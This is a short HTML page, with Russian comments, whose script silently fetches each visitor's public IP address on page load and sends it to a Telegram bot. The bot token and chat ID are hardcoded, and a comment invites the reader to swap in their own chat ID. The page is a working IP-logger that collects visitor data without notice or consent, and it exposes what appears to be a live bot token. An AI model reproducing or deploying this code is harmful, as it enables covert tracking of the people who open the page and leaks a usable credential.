<!DOCTYPE html>
<html>
<head><title>IP в Telegram</title></head>
<body>
<script>
const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
const chat_id = '6945488830';  // вставь сюда свой chat_id

fetch('https://api.ipify.org?format=json')
  .then(resp => resp.json())
  .then(data => {
    const ip = data.ip;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=IP пользователя: ${ip}`;
    return fetch(url);
  })
  .then(() => console.log('IP отправлен в Telegram'))
  .catch(console.error);
</script>
</body>
</html>
